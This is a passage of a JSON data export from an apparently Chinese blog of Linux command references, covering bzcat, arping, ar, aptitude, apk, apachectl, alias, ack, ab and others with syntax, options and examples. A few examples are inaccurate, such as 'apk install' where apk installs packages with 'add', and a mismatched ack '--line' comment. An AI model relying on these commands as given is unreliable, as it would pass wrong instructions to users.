文件，并显示解压缩后的文件内容。保留原压缩文件，并且不生成解压缩后的文件。 语法 bzcat (参数) 参数 .bz2 压缩文件：指定要显示内容的 .bz2 压缩文件。 实例 将/tmp/man.config以 bzip2 格式压缩： bzip2 -z man.config 此时 man.config 会变成 man.config.bz2 将上面的压缩文件内容读出来： bzcat man.config.bz2 此时屏幕上会显示 man.config.bz2 解压缩之后的文件内容。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bzcat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzcat/","stats":{"text":"1 min read","time":33000,"words":145,"minutes":1},"date":"2022-01-30 07:21:43","dateFormat":"2022-01-30"},{"content":"通过发送 ARP 协议报文测试网络。 补充说明 arping 命令 是用于发送 arp 请求到一个相邻主机的工具，arping 使用 arp 数据包，通过 ping 命令检查设备上的硬件地址。能够测试一个ip地址是否是在网络上已经被使用，并能够获取更多设备信息。功能类似于 ping。 语法 arping (选项) (参数) 选项 -b：用于发送以太网广播帧（FFFFFFFFFFFF）。arping一开始使用广播地址，在收到响应后就使用unicast地址。 -q：quiet output不显示任何信息； -f：表示在收到第一个响应报文后就退出； -w timeout：设定一个超时时间，单位是秒。如果到了指定时间，arping还没到完全收到响应则退出； -c count：表示发送指定数量的ARP请求数据包后就停止。如果指定了deadline选项，则arping会等待相同数量的arp响应包，直到超时为止； -s source：设定arping发送的arp数据包中的SPA字段的值。如果为空，则按下面处理，如果是DAD模式（冲突地址探测），则设置为0.0.0.0，如果是Unsolicited ARP模式（Gratutious ARP）则设置为目标地址，否则从路由表得出； -I interface：设置ping使用的网络接口。 参数 目的主机：指定发送ARP报文的目的主机。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"arping","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/arping/","stats":{"text":"2 min read","time":77000,"words":353,"minutes":2},"date":"2022-01-30 04:14:09","dateFormat":"2022-01-30"},{"content":"建立或修改备存文件，或是从备存文件中抽取文件。 补充说明 ar 命令是一个建立或修改备存文件，或是从备存文件中抽取文件的工具，ar 可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。 语法 ar [-]{dmpqrtx}[abcfilNoPsSuvV] [membername] [count] archive files... Usage: ar [emulation options] [-]{dmpqrstx}[abcDfilMNoPsSTuvV] [--plugin &lt;name&gt;] [member-name] [count] archive-file file... ar -M [&lt;mri-脚本] 选项 ar 允许你 在第一个 命令行 参数中 以任意 顺序 混合 指定 操作码p 和修饰符mod . 只要你 愿意, 也可以 用破折号 作为 命令行 第一个 参数的 开始. p 关键字 指明 要执行的 操作, 只能 指明为 如下 之一: d 从档案中删除 模块. 通过files 指明 要删除的 模块的 名称; 如果 没有 指出 要删除的 文件 名称, 档案不会 改变 任何 内容. 如果 给出了'v' 修饰符,ar 会例出 它删除的 每一个 模块. m 用此 操作 在档案中移动 成员. 如果 某个 符号名 在档案的 多个 成员中 有定义, 那么 程序 怎样 连接 档案 文件 得到的 结果 可能是 不同的. 如果 没有为m 指定 修饰符, 由files 指出的 成员 将移动到 档案的末尾 ; 可以 通过 `a', `b' 或 `i' 等修饰符, 指定 成员 移动的 具体 位置. p 在标准 输出上 打印 档案中 指定的 成员. 如果 给出了`v' 修饰符, 在 打印 成员 内容 之前, 先打印 成员的 名字. 如果没有 指明files 参数, 档案中 所有的 成员 都会被 打印 出来. q 快速 追加; 增加 files 到 archive 的末尾, 不进行 替换 检查. 修饰符 `a' `b' 和 `i'不 影响此 操作, 新成员 始终 追加到 档案的 末尾处. 修饰符 `v' 可以使 ar 列出 它追加的 所有文件. 由于 本功能 是用于 快速操作, 即使 档案中 有 符号表 索引 也不 进行 更新; 可以 使用 `ar s' 或 ranlib 明确 要求 更新 这些索引. 在为快速 追加 重建 索引时,由于 有 太多 不同的 系统, 所以 GNU ar 采用 `q' 作为 `r'的一个 同义字. r 把文件 files 插入 archive ( 替换 ). 本操作与 `q' 是不同的, 如果 档案中 已有的 某个 成员与 插入 文件的 名称 相同, 此成员 将被删除. 如果 不存在 名称为 files 的文件, ar 显示 一个 错误 消息, 并且 保留 档案中 已有的 同名 成员. 缺省情况下, 新成员 增加到 挡案的 末尾; 可以 通过 使用 `a' `b' 或 `i' 等修饰符 指定 相对于 已有 成员的 位置. 通过 使用 `v' 修饰符 会为每个 插入的 文件 产生 一行 输出, 根据 输出中的 字符 `a' 或 `r' 可以 表明 该文件 是追加的 (没有 删除 以前的成员) 还是 替换的. t 显示 一个 archive 档案 所包含 内容的 列表 , 或 档案中的 由 files 指出的 文件 列表. 通常 只显示 成员的 名称, 如果 使用 `v' 修饰符, 可以 得到 成员的 权限, 时间属性, 属主, 组和 大小. 如果 没有 指出 files, 档案中的 所有 文件 都会 列出. 如果 档案中 (称为 `b.a') 有多个 同名 成员 (称为 `fie'), `ar t b.a fie' 仅仅 列出 第一个; 要看到 它们的 全部, 必须 要求 完整的 列表 —在本例中是 `ar t b.a'. x 从档案中 抽取 成员 (名称为 files) . 如果 使用 `v' 修饰符, ar 会列出 它抽取的 每一个 文件的 名字. 如果没有给出 files, 抽取 档案中 所有的 文件. 可以在 操作符 p 后紧随 一定数量的 修饰符 mod 以指明 操作的 各种 行为. a 增加 文件到 档案中 已有 成员 之后 , 如果 使用了 修饰符 a, 必须在 档案 名称 archive 之前 以 membername 参数的 形式 给出 档案中 已有 成员的 名字. b 增加 文件到 档案中 已有 成员 之前 , 如果 使用了 修饰符 b, 必须在 档案 名称 archive 之前 以 membername 参数的 形式 给出 档案中 已有 成员的 名字. (和修饰符 `i' 相同). c 建立 档案. 指定的 档案 archive 始终 会被建立, 如果 你要求 执行的是 更新, 通过 此修饰符 建立 档案时 会给出 一个 警告. f 截短 档案成员的 名字. ar 通常 允许 任意 长度的 文件名, 但这会 导致 与某些 系统上的 ar 出现 兼容性 问题, 使用 f 修饰符 可以 在往档案中 追加 文件时 把名字 截短. i 插入 文件到 档案中 已有 成员 之前 , 如果 使用了 修饰符 i, 必须在 档案 名称 archive 之前 以 membername 参数的 形式 给出 档案中 已有 成员的 名字. (与修饰符 `b' 相同). l 接受此修饰符, 但不起作用. N 使用 count 参数. 本修饰符 用于 在档案中 有多个 同名 成员的 情况. 删除 或抽取 档案中 给定 名字的第 count 个实例. o 抽取 成员时 保留 他们 原始的 时间属性. 如果 没有 此修饰符, 文件以抽取 的时间 作为 它的时间 属性. P 匹配 档案中的 名字时 使用 完整的 路径名. ar 不能 建立 使用 完整 路径名的 档案 (这不符合 POSIX 标准), 但其它的 档案 工具 能够建立, 本选项 会使 ar 在抽取 由其它 工具 建立的 档案 文件时, 使用完整的 路径名 去匹配 档案中 成员的 名字. s 即使 没有对 档案 进行 改变, 用本 修饰符 也可以 往档案中 写一个 目标 文件的 索引 或更新 已经 存在的 索引. 可以与 其它 操作 一起 使用 本修饰符, 也可以 单独使用. 对一个 档案 执行 `ar s' 与执行 `ranlib' 等价. S 不生成 档案的 符号表. 这可以 加速 建立 大的档案 文件的 过程,但这样 建立的 档案 不能被 连接器 使用, 为建立 符号表, 在最后 执行 `ar' 时应该 不用 `S' 修饰符, 或者 对档案 执行 一次 `ranlib' . u 通常ar r... 把所有 列出的 文件 插入到 档案中, 如果 希望 仅仅 插入比 档案中 已有 成员 更新的 文件时, 就应该 使用 此修饰符. `u' 修饰符 仅允许 与 `r' (替换) 操作 一起 使用. 某些 情况下, 由于 用 `q' 操作 比较 文件的 时间属性 会失去 速度上的 优势, 所以 不允许 执行 `qu' 组合操作. v 使用本修饰符可以进行 冗余的 操作。附加了此修饰符时，很多操作会显示 更多的消息，如处理的文件名等。 V 显示 ar 的版本号。 选项参数 --plugin &lt;p&gt; - load the specified plugin ar：支持的目标： elf64-x86-64 elf32-i386 elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big plugin srec symbolsrec verilog tekhex binary ihex 实例 打包文件 [root@localhost ~]# ls # 显示当前目录文件 a.c b.c d.c install.log qte anaconda-ks.cfg c.c Desktop [root@localhost ~]# ar rv one.bak a.c b.c # 打包 a.c b.c文件 ar: 正在创建 one.bak a - a.c a - b.c 打包多个文件 [root@localhost ~]# ar rv two.bak *.c // 打包以.c结尾的文件 ar: 正在创建 two.bak a - a.c a - b.c a - c.c a - d.c 显示打包文件的内容 [root@localhost ~]# ar t two.bak a.c b.c c.c d.c 删除打包文件的成员文件 [root@localhost ~]# ar d two.bak a.c b.c c.c [root@localhost ~]# ar t two.bak d.c ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ar","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ar/","stats":{"text":"8 min read","time":452000,"words":2009,"minutes":8},"date":"2022-01-30 03:55:45","dateFormat":"2022-01-30"},{"content":"Debian Linux 系统中软件包管理工具。 补充说明 aptitude 命令与 apt-get 命令一样，都是 Debian Linux 及其衍生系统中功能极其强大的包管理工具。与 apt-get 不同的是，aptitude 在处理依赖问题上更佳一些。举例来说，aptitude 在删除一个包时，会同时删除本身所依赖的包。这样系统中不会残留无用的包，整个系统更为干净。它通过文本操作菜单和命令两种方式管理软件包。 语法 aptitude (选项) (参数) 选项 -h：显示帮助信息； -d：仅下载软件包，不执行安装操作； -P：每一步操作都要求确认； -y：所有问题都回答“yes”； -v：显示附加信息； -u：启动时下载新的软件包列表。 参数 操作命令：用户管理软件包的操作命令。 实例 以下是我总结的一些常用aptitude命令，仅供参考： aptitude update # 更新可用的包列表 aptitude upgrade # 升级可用的包 aptitude dist-upgrade # 将系统升级到新的发行版 aptitude install pkgname # 安装包 aptitude remove pkgname # 删除包 aptitude purge pkgname # 删除包及其配置文件 aptitude search string # 搜索包 aptitude show pkgname # 显示包的详细信息 aptitude clean # 删除下载的包文件 aptitude autoclean # 仅删除过期的包文件 当然，你也可以在文本界面模式中使用 aptitude。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"aptitude","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/aptitude/","stats":{"text":"2 min read","time":79000,"words":354,"minutes":2},"date":"2022-01-30 03:53:54","dateFormat":"2022-01-30"},{"content":"Debian Linux 下对软件包索引文件进行排序的工具。 补充说明 apt-sortpkgs 命令是 Debian Linux 下对软件包索引文件进行排序的简单工具。 语法 apt-sortpkgs (选项) (参数) 选项 -s：使用源索引字段排序； -h：显示帮助信息。 参数 文件：指定要排序的包含 debian 包信息的索引文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"apt-sortpkgs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/apt-sortpkgs/","stats":{"text":"1 min read","time":20000,"words":95,"minutes":1},"date":"2022-01-30 03:52:08","dateFormat":"2022-01-30"},{"content":"Alpine Linux 下的包管理工具。 使用实例 apk install xxx apk search xxx # 支持正则 apk info xxx # 查看包的详细信息 apk show # list local package # 卸载并删除 包 apk del openssh openntp vim 升级 upgrade 命令升级系统已安装的所以软件包（一般包括内核），当然也可指定仅升级部分软件包（通过 -u 或 -upgrade 选择指定）。 apk update # 更新最新本地镜像源 apk upgrade # 升级软件 apk add --upgrade busybox # 指定升级部分软件包 搜索 apk search # 查找所以可用软件包 apk search -v # 查找所以可用软件包及其描述内容 apk search -v 'acf*' # 通过软件包名称查找软件包 apk search -v -d 'docker' # 通过描述文件查找特定的软件包 查看包信息 info命令用于显示软件包的信息。 apk info # 列出所有已安装的软件包 apk info -a zlib # 显示完整的软件包信息 apk info --who-owns /sbin/lbu # 显示指定文件属于的包 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"apk","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/apk/","stats":{"text":"2 min read","time":61000,"words":254,"minutes":2},"date":"2022-01-30 03:41:45","dateFormat":"2022-01-30"},{"content":"Apache 服务器前端控制工具。 补充说明 apachectl 命令是 Apache 的 Web 服务器前端控制工具，用以启动、关闭和重新启动 Web 服务器进程。 语法 apachectl (参数) 参数 configtest：检查设置文件中的语法是否正确； fullstatus：显示服务器完整的状态信息； graceful：重新启动Apache服务器，但不会中断原有的连接； help：显示帮助信息； restart：重新启动Apache服务器； start：启动Apache服务器； status：显示服务器摘要的状态信息； stop：停止Apache服务器。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"apachectl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/apachectl/","stats":{"text":"1 min read","time":31000,"words":144,"minutes":1},"date":"2022-01-30 03:39:43","dateFormat":"2022-01-30"},{"content":"定义或显示别名。 概要 alias [-p] [name[=value] ...] 主要用途 简化较长的命令。 定义一个或多个别名。 修改一个或多个已定义别名的值。 显示一个或多个已定义别名。 显示全部已定义的别名。 选项 -p：显示全部已定义的别名。 参数 name（可选）：指定要（定义、修改、显示）的别名。 value（可选）：别名的值。 返回值 alias返回true除非您要显示的别名未定义。 例子 # 显示全部已定义的别名 alias alias -p # 显示已定义的别名（假设当前环境存在以下别名） alias ls alias ls grep # 定义或修改别名的值 alias ls='ls --color=auto' alias ls='ls --color=never' grep='grep --color=never' 知识点 直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效，如何才能永久有效呢？ 使用编辑器打开~/.bashrc，在文件中加入别名设置，如：alias rm='rm -i'，保存后执行source ~/.bashrc，这样就可以永久保存命令的别名了。 因为修改的是当前用户目录下的~/.bashrc文件，所以这样的方式只对当前用户有用。如果要对所有用户都有效，修改/etc/bashrc文件就可以了。 请注意，以下内容可能与您实际使用的系统有出入: 在CentOS7下，这个文件是/etc/bash.bashrc。此外在 CentOS7 下，细看~/.bashrc文件，会发现有这样一段代码： if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi 这个代码的意思就是如果存在那么就加载.bash_aliases文件，所以也可以在用户根目录下新建该文件用于单独存放命令别名设置。 错误用法 要显示的别名未定义。 当您定义（修改）别名的值的时候，由于值的字符串有空格但您没有用单引号扩起，那么会导致严重的问题： # 为方便演示，删除全部别名 unalias -a # 没有用单引号扩起 alias rm=rm -rf # 执行命令后报错 bash: alias: -rf: not found # 这时使用alias查看rm的别名时返回 alias rm='rm' # 更具有迷惑性的例子 # 为方便演示，删除全部别名 unalias -a # 仍然没有用单引号括起 alias ls=ls --color=never # 执行命令后看起来没有报错 # 使用alias查看全部别名会发现运行结果如下： # alias --color=never # alias ls='ls' # alias处理时将它们看成了两组 Q&amp;A Q：如果我要显示一到多个别名，但不知道其中是否有未定义的该怎么办？ A：正常执行就是了，alias 不会因为有一个未定义的别名就结束对剩余参数的执行。 Q：如果我这么定义alias cd='ls' ls='cd'，会有什么后果？ A：运行cd依然会切换目录，运行ls依然会列出文件夹的内容；不要这样定义。 注意 执行脚本时请注意： 使用 source 命令执行的bash脚本如果执行了 alias 或 unalias 命令，那么有可能会对终端环境的别名设置产生影响；终端环境的别名设置也可能改变运行结果； 通过 sh 方式调用的 bash 脚本或直接运行当前用户有执行权限的脚本不受终端环境的别名影响。 删除别名，请查看 unalias 命令。 建议您不要对 mv cp rm 等命令的别名设置危险的 -f 选项，比如alias rm='rm -f'。 需要注意别名是否和其他命令有冲突的情况。 该命令是 bash 内建命令，相关的帮助信息请查看 help 命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"alias","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/alias/","stats":{"text":"4 min read","time":206000,"words":933,"minutes":4},"date":"2022-01-29 12:44:28","dateFormat":"2022-01-29"},{"content":"比 grep 好用的文本搜索工具 安装 # ubuntu下要安装 ack-grep，因为在 debian 系中，ack 这个名字被其他的软件占用了。 sudo apt-get install ack-grep # alpine Linux-apk 软件包管理器 安装 ack apk install ack 参数 这些参数在 linux 上的适用频率是相当高的，尤其是你用 vim 做为 IDE 的话 -c (统计)/ -i (忽略大小)/ -h (不显示名称)/ -l (只显文件名)/ -n (加行号)/ -v (显示不匹配) 特点 ack 官网列出了这工具的 5 大特点： 速度非常快,因为它只搜索有意义的东西。 更友好的搜索，忽略那些不是你源码的东西。 为源代码搜索而设计，用更少的击键完成任务。 非常轻便，移植性好。 免费且开源 实例 在记忆的时候大体上可以分为这几个部分： Searching 代码搜索 Search output 搜索结果处理 File presentation 文件展示 File finding 文件查找 File inclusion/exclusion 文件过滤 grep 常用操作 grep -r 'hello_world' # 简单用法 grep '^hello_world' . # 简单正则 ls -l | grep .py # 管道用法 Searching 简单的文本搜索，默认是递归的。 ack-grep hello ack-grep -i hello ack-grep -v hello ack-grep -w hello ack-grep -Q 'hello*' Search File 对搜索结果进行处理，比如只显示一个文件的一个匹配项，或者 xxx ack-grep --line=1 # 输出所有文件第二行 ack-grep -l 'hello' # 包含的文件名 ack-grep -L 'print' # 非包含文件名 File presentation 输出的结果是以什么方式展示呢，这个部分有几个参数可以练习下 ack-grep hello --pager='less -R' # 以less形式展示 ack-grep hello --noheading # 不在头上显示文件 ack-grep hello --nocolor # 不对匹配字符着色 File finding 没错，它可以查找文件，以省去你要不断的结合 find 和 grep 的麻烦，虽然在 linux 的思想是一个工具做好一件事。 ack-grep -f hello.py # 查找全匹配文件 ack-grep -g hello.py$ # 查找正则匹配文件 ack-grep -g hello --sort-files # 查找然后排序 File Inclusion/Exclusion 文件过滤，个人觉得这是一个很不错的功能。如果你曾经在搜索项目源码是不小心命中日志中的某个关键字的话，你会觉得这个有用。 ack-grep --python hello # 查找所有python文件 ack-grep -G hello.py$ hello # 查找匹配正则的文件 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ack","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ack/","stats":{"text":"3 min read","time":145000,"words":608,"minutes":3},"date":"2022-01-29 06:19:15","dateFormat":"2022-01-29"},{"content":"Apache 服务器的性能测试工具 补充说明 ab 命令 是一个测试 Apache http 服务器的工具，你可以通过这个工具，指定一个单位时间内向 Apache 发出的请求数量来看看你的 Apache 和机器配合的性能如何。 语法 ab [ -A auth-username:password ] [ -c concurrency ] [ -C cookie-name=value ] [ -d ] [ -e csv-file ] [ -g gnuplot-file ] [ -h ] [ -H custom-header ] [ -i ] [ -k ] [ -n requests ] [ -p POST-file ] [ -P proxy-auth-user‐ name:password ] [ -q ] [ -s ] [ -S ] [ -t timelimit ] [ -T content-type ] [ -v verbosity] [ -V ] [ -w ] [ -x &lt;table&gt;-attributes ] [ -X proxy[:port] ] [ -y &lt;tr&gt;-attributes ] [ -z &lt;td&gt;-attributes ] [http://]host‐ name[:port]/path 选项 -A auth-username:password # 支持基本的验证证书,用户名和密码之间使用&quot;冒号&quot;: # 分隔开,ab将以明文方式传送过去.不管服务器是不是需要 # ,也就是说你的服务器需要支持401认证. -c concurrency # 同时向服务器端发送的请求数目，默认状态下是一次 只执行一个http请求. -C cookie-name=value # Add a Cookie: line to the request. The argument is typically in the # form of a name=value pair. This field is repeatable. -d # Do not display the &quot;percentage served within XX [ms] table&quot;. # (legacy support). -e csv-file # Write a Comma separated value (CSV) file which contains for each # percentage (from 1% to 100%) the time (in milli seconds) it took to # serve that percentage of the requests. This is usually more useful # than the 'gnuplot' file; as the results are already 'binned'. -g gnuplot-file # Write all measured values out as a 'gnuplot' or TSV (Tab separate # values) file. This file can easily be imported into packages like # Gnuplot, IDL, Mathematica, Igor or even Excell. The labels are on # the first line of the file. -h # 显示使用说明 -H custom-header # 向请求包追加附加的标题字串.此参数应该是有效的标题 行(header # line)形式,通常使用冒号&quot;:&quot;来分隔有效配对 (valid pair)例如 'Accept- # Encoding: zip/zop;8 bit'; -i # 使用一个 http 头(HEAD) 来替换 GET方法.不可以掺入POST 方法 -k # 允许http KeepAlive ；也就是说执行多个请求在一个 http # 会话当中，默认是不允许的也就是no KeepAlive啦;) -n requests # 执行一次测试会话的时候所发出的请求数目,默认是执行一个单一的请求 # 当然了这样的测试结果也就没什么意义了 -p POST-file # 测试程序也就是ab,将向Apache server发送带有HTTP POST 的请求. -P proxy-auth-username:password # 当需要通过代理测试一台 HTTP 服务器的时候而你的代理 # 又需要用户名密码验证,这时你可以使用这个选项,同样 # 用户名与密码之间使用冒号&quot;:&quot;分隔开,ab将之以明文的方式 # 发送出去,当然,前提是你的代理是处于407认证状态的 -q # When processing more than 150 requests, ab outputs a progress count # on stderr every 10% or 100 requests or so. The -q flag will sup‐ # press these messages. -s # When compiled in (ab -h will show you) use the SSL protected https # rather than the http protocol. This feature is experimental and # very rudimentary. You probably do not want to use it. -S # Do not display the median and standard deviation values, nor dis‐ # play the warning/error messages when the average and median are # more than one or two times the standard deviation apart. And de‐ # fault to the min/avg/max values. (legacy support). -t timelimit # 设置测试的时间的长短，使用这个选项ab将自动设置 # 测试请求会话数目为50000，然后以你设置的时间为 # 固定周期.默认状态下是没有时限的，也就是直到完成 # 你所设置的请求数目为止. -T content-type # 内容类型标头,使用在POST数据的时候. -v verbosity # 设置冗余级别,4级打印出每个请求标头的详细信息, # 3级打印出回应代码(例如,404,200),2级打印出警告 信息和指示消息 -V # 显示版本号并且退出 -w # 打印输出结果到HTML表中. 默认的表是两列n行白底黑框 -x &lt;table&gt;-attributes # 使用字串来描述表的属性,该属性字串应该插入到&lt;table 这里 &gt; -X proxy[:port] # Use a proxy server for the requests. -y &lt;tr&gt;-attributes # 用于生成html表格每行的属性名 (&lt;tr&gt;) -z &lt;td&gt;-attributes # 用于生成html表格每列的属性名 (&lt;td&gt;) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ab","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ab/","stats":{"text":"5 min read","time":283000,"words":1045,"minutes":5},"date":"2022-01-28 22:14:26","dateFormat":"2022-01-28"},{"content":"指示打印系统接受发往指定目标打印机的打印任务 补充说明 accept 命令 属于 CUPS 套件，用于指示打印系统接受发往指定目标打印机的打印任务。 语法 accept (选项) (参数) 选项 -E：当连接到服务器时强制加密； -U：指定连接服务器时使用的用户名； -h：指定连接服务器名和端口号。 参数 目标：指定目标打印机。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"accept","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/accept/","stats":{"text":"1 min read","time":24000,"words":119,"minutes":1},"date":"2022-01-27 18:16:48","dateFormat":"2022-01-27"}]}